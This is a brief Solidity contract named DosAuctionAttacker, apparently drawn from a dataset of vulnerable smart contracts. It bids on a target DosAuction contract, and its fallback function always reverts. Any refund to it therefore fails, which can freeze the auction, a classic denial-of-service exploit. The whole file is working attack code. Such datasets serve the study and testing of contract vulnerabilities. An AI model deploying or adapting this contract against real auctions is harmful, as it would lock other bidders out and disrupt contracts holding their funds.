pragma solidity ^0.4.15;

import "../dataset/denial_of_service/auction.sol";

contract DosAuctionAttacker {
    DosAuction public auction;

    function DosAuctionAttacker(address _auctionAddress) public {
        auction = DosAuction(_auctionAddress);
    }

    function() external payable {
        revert("Always revert");
    }

    function attack() external payable {
        auction.bid.value(msg.value)();
    }
}